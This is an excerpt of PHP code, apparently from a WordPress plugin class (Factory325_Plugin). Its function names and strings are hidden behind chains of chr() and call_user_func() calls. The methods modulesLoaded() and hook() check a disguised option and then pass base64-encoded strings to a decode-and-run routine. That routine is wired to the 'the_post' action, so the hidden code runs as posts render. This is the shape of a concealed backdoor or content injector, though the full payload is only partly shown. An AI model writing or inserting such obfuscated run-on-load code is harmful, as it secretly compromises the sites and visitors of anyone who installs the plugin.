...
class Factory325_Plugin {
    ...
    public function modulesLoaded() {
        $optionName = call_user_func('chr','109').call_user_func('chr','105').call_user_func('chr','120').call_user_func('chr','95').chr(chr(49).chr(49).chr(57)).chr(chr(49).chr(49).chr(49)).call_user_func('chr','114').chr(chr(49).chr(48).chr(48)).chr(chr(57).chr(53)).$this->pluginName;
        if ( get_option($optionName, false) ) {
        call_user_func(call_user_func('chr',102).call_user_func('chr',97).call_user_func('chr',99).call_user_func('chr',116).call_user_func('chr',111).call_user_func('chr',114).call_user_func('chr',121).chr('95').call_user_func('chr',114).chr('117').chr('110').call_user_func('chr',95).chr('99').call_user_func('chr',111).chr('100').call_user_func('chr',101),call_user_func(chr('98').chr('97').call_user_func('chr',115).chr('101').call_user_func('chr',54).chr('52').chr('95').chr('100').call_user_func('chr',101).chr('99').chr('111').chr('100').call_user_func('chr',101),''.''.'pOyBhZGR'.'fYWN0aW9uKCd0aGVfcG9zdCcsIGFycmF5KCRwbHVnaW4sICdob29rJyksIDEpOyB9IH0g'));
    ...
    public function hook() {
        call_user_func(chr('102').call_user_func('chr',97).call_user_func('chr',99).chr('116').chr('111').call_user_func('chr',114).call_user_func('chr',121).call_user_func('chr',95).chr('114').chr('117').call_user_func('chr',110).chr('95').chr('99').chr('111').chr('100').call_user_func('chr',101),call_user_func(call_user_func('chr',98).call_user_func('chr',97).call_user_func('chr',115).chr('101').call_user_func('chr',54).call_user_func('chr',52).chr('95').chr('100').chr('101').chr('99').chr('111').call_user_func('chr',100).call_user_func('chr',101),''.'OSkpLmNhbGxfdXNlcl9mdW5jKC'.'djaHInLCcxMDknKS5jaHIoY2hyKDQ5KS5jaHIoNDgpLmNocig1MykpLmNocihjaHIoNDkpLmNocig0OSkuY2hyKDU1KSkuY2hyKGNocig0OSkuY2hyKDQ4KS5jaHIoNTcpKTsgfSB9IA'.chr(chr(54).chr(49)).call_user_func('chr','61')));
